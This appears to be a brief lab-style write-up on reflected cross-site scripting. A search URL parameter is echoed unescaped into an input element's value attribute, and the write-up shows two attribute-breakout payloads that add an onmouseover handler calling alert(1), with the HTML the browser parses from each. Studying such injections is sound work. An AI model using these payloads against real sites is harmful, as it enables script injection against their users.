We have a search button that based on ?search url parameter injects code into HTML.
`<input type="text" placeholder="..." name="search" value=""">`
The target here is to add an event that triggers Javascript code. For `<input>` element, we have onmouseover event.

So our next step is to inject that event in the `input`:
## Payload 1
`" onmouseover=alert(1)`
### Result
The HTML parser adds quotes because the payload is malformed ->
`<input type="text" placeholder="..." name="search" value="" onmouseover="alert(1)&quot;">`

## Payload 2
`" onmouseover="alert(1)`
### Result
Here the HTML parser does nothing ->
`<input type="text" placeholder="..." name="search" value="" onmouseover="alert(1)">`